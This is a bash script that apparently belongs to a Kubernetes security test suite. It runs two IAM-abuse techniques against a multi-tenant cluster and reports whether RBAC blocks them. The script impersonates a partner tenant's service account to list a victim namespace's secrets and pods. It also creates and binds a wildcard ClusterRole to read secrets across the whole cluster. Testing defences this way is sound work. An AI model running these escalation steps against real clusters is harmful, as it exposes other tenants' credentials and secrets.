#!/usr/bin/env bash
# =============================================================================
# ATTACK A3 — IAM Abuse
# Doc class : A3  |  Script: attack3.sh
# Spec      : Rev5 Section 13
# Objective : exploit overpermissioned IAM bindings to access restricted data
# Attacker  : MUST originate from tenant-partner, not tenant-lowpriv
#
# Techniques (spec-aligned):
#   T1 — Scoped Binding Escalation  Restricted-partner SA uses overpermissioned
#                                   RoleBinding to call API endpoints outside
#                                   permitted namespace
#   T2 — Wildcard ClusterRole       ClusterRole with wildcard permissions planted
#                                   on tenant-partner; reads secrets cluster-wide
#
# Primary defenders:
#   T1 → L3a (RBAC: scoped binding should not grant cross-ns access)
#   T2 → L3a (RBAC: wildcard ClusterRole creation blocked)
#
# Output: SUCCESS|<technique>|<detail>
#         BLOCKED|<technique>|<detail>
#         SKIP|<reason>
# =============================================================================
set -euo pipefail

ATTACKER_NS="${ATTACKER_NS:-tenant-partner}"   # MUST be tenant-partner per spec
VICTIM_NS="${VICTIM_NS:-tenant-finserv}"
SEED="${SEED:-$$}"

succeed() { echo "SUCCESS|$1|$2"; exit 0; }
blocked() { echo "BLOCKED|$1|$2"; exit 1; }
skip()    { echo "SKIP|$1";       exit 2; }

TECHNIQUES=(t1-scoped-binding-escalation t2-wildcard-clusterrole)
N_TECH=${#TECHNIQUES[@]}
: "${TECHNIQUE_IDX:?TECHNIQUE_IDX env var required}"
[[ "$TECHNIQUE_IDX" -lt 0 || "$TECHNIQUE_IDX" -ge "$N_TECH" ]] && {
  echo "SKIP|TECHNIQUE_IDX-out-of-range-$TECHNIQUE_IDX"; exit 2; }
TECHNIQUE="${TECHNIQUES[$TECHNIQUE_IDX]}"
echo "[A3] SEED=$SEED TECHNIQUE_IDX=$TECHNIQUE_IDX technique=$TECHNIQUE"
echo "[A3] attacker_ns=$ATTACKER_NS (must be tenant-partner)"

CRB_NAME="a3-wcr-$$"
CR_NAME="a3-wildcard-$$"

cleanup() {
  kubectl delete clusterrolebinding "$CRB_NAME" --ignore-not-found 2>/dev/null || true
  kubectl delete clusterrole "$CR_NAME" --ignore-not-found 2>/dev/null || true
}
trap cleanup EXIT

ATTACKER_POD=$(kubectl get pod -n "$ATTACKER_NS" -l app=client \
  --field-selector=status.phase=Running \
  -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
[[ -z "$ATTACKER_POD" ]] && skip "no-attacker-pod-in-$ATTACKER_NS"

case "$TECHNIQUE" in

  t1-scoped-binding-escalation)
    # The tenant-partner-nodes-read ClusterRoleBinding (nodes: get,list) exists at C0
    # as a deliberately overpermissioned baseline grant (misconfigured operator).
    # Attempt: use that binding to escalate beyond its intended scope by calling
    # API endpoints outside the permitted resource (try to read secrets cluster-wide)
    # Success = tenant-partner:default SA can read resources beyond nodes (e.g. secrets in victim NS)
    # Blocked by L3a: RBAC limits tenant-partner:default to only nodes read, nothing else
    echo "[A3-t1] testing if overpermissioned binding allows escalation beyond scope"

    # First confirm the intended grant works (nodes read)
    NODES=$(kubectl get nodes \
      --as="system:serviceaccount:${ATTACKER_NS}:default" \
      --no-headers 2>/dev/null | wc -l || echo "0")
    echo "[A3-t1] nodes accessible (expected): $NODES"

    # Now attempt to escalate beyond the binding's intended scope
    SECRETS=$(kubectl get secrets -n "$VICTIM_NS" \
      --as="system:serviceaccount:${ATTACKER_NS}:default" \
      --no-headers 2>/dev/null | wc -l || echo "0")
    SECRETS="${SECRETS:-0}"
    echo "[A3-t1] secrets in $VICTIM_NS via escalation attempt: $SECRETS"

    PODS=$(kubectl get pods -n "$VICTIM_NS" \
      --as="system:serviceaccount:${ATTACKER_NS}:default" \
      --no-headers 2>/dev/null | wc -l || echo "0")
    PODS="${PODS:-0}"
    echo "[A3-t1] pods in $VICTIM_NS via escalation attempt: $PODS"

    if [[ "$SECRETS" -gt 0 || "$PODS" -gt 0 ]]; then
      succeed "t1-scoped-binding-escalation" \
        "escalated-beyond-scope secrets=$SECRETS pods=$PODS ns=$VICTIM_NS"
    else
      blocked "t1-scoped-binding-escalation" \
        "rbac-scoped-correctly escalation-denied"
    fi
    ;;

  t2-wildcard-clusterrole)
    # Attempt to create a wildcard ClusterRole and bind it to attacker SA
    # Then use it to read secrets cluster-wide
    # Success = wildcard CR created and grants cluster-wide secret access
    # Blocked by L3a: RBAC prevents creation of wildcard ClusterRole
    echo "[A3-t2] creating wildcard ClusterRole targeting all resources"

    CR_OUT=$(kubectl apply -f - 2>&1 <<EOF || echo "DENIED"
apiVersion: rbac.authorization.k8s.io/v1
kind: ClusterRole
metadata:
  name: $CR_NAME
  labels:
    attack-artifact: "true"
rules:
- apiGroups: ["*"]
  resources: ["*"]
  verbs: ["*"]
EOF
)
    echo "[A3-t2] ClusterRole result: $CR_OUT"

    if echo "$CR_OUT" | grep -qi "denied\|forbidden\|error"; then
      blocked "t2-wildcard-clusterrole" "rbac-denied-clusterrole-creation"
    fi

    # Bind it to the attacker SA
    CRB_OUT=$(kubectl create clusterrolebinding "$CRB_NAME" \
      --clusterrole="$CR_NAME" \
      --serviceaccount="${ATTACKER_NS}:default" 2>&1 || echo "DENIED")
    echo "[A3-t2] ClusterRoleBinding result: $CRB_OUT"

    if echo "$CRB_OUT" | grep -qi "denied\|forbidden\|error"; then
      blocked "t2-wildcard-clusterrole" "rbac-denied-crb-creation"
    fi

    # Use wildcard role to read secrets cluster-wide
    SECRET_COUNT=$(kubectl get secrets -A \
      --as="system:serviceaccount:${ATTACKER_NS}:default" \
      --no-headers 2>/dev/null | wc -l || echo "0")
    SECRET_COUNT="${SECRET_COUNT:-0}"
    echo "[A3-t2] cluster-wide secrets accessible: $SECRET_COUNT"

    [[ "$SECRET_COUNT" -gt 0 ]] \
      && succeed "t2-wildcard-clusterrole" \
           "wildcard-cr-granted cluster-secrets=$SECRET_COUNT" \
      || blocked "t2-wildcard-clusterrole" \
           "rbac-denied-read secrets=0"
    ;;

  *)
    skip "unknown-technique-$TECHNIQUE"
    ;;
esac
